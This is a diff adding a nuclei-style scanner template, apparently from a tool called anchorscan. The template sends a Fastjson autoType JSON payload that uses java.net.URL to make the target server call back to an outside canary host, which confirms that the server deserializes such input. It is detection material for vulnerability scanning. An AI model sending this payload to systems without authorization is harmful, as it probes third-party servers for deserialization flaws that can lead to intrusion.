@@ -1,0 +1,21 @@
+id: anchorscan-canary-fastjson
+info:
+  name: Anchorscan Fastjson canary callback
+  author: anchorscan
+  severity: high
+  description: |
+    Plants canary_base/canary_token into a Fastjson autoType-style JSON body.
+    The anchorscan process-local canary listener emits the Finding on callback
+    (confidence=verified); nuclei matchers are intentionally empty.
+  tags:
+    - canary
+    - fastjson
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"@type":"java.net.URL","val":"{{canary_base}}/c/{{canary_token}}"}
+    # Channel self-check: no matchers — finding comes from canary listener only.
